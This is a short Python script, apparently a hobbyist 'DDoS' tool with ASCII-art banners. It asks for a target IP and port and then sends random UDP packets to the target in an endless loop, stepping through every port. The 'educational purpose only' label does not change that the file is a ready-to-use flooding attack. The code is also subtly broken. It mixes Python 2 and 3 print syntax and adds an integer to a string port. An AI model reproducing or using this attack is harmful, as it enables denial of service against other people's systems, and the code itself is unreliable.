#!/usr/bin/python3

#EDUCATIONAL PURPOSE ONLY

import socket
import random
import threading
import os
import sys
import time

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

os.system("clear") 
os.system("figlet okeh-ddos") 
print(" ")
print("           0ppppppp0      0  0      0000000      0     0        ") 
print("           0       0      0 0       0            0     0        ") 
print("           0       0      00        0000000      0000000        ") 
print("           0       0      00        0000000      0     0        ") 
print("           0       0      0 0       0            0     0        ") 
print("           0ppppppp0      0  0      0000000      0     0        ") 
print("THIS TOOLS DONT ATTACK GOV")
ip = input("IP Target : ")
port = input("Port     : ")
os.system("clear")
os.system("figlet Ddos Attack")
print "[                       ] 0% "
time.sleep(5)
print "[======                 ] 25%"
time.sleep(5)
print "[==========             ] 50%"
time.sleep(5)
print "[===============        ] 75%"
time.sleep(5)
print "[=======================] 100%"
time.sleep(3) 
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print("Sent %s packet to %s trought port:%s")%(sent,ip,port) 
     if port == 65534:
         port = 1

#Done cuy
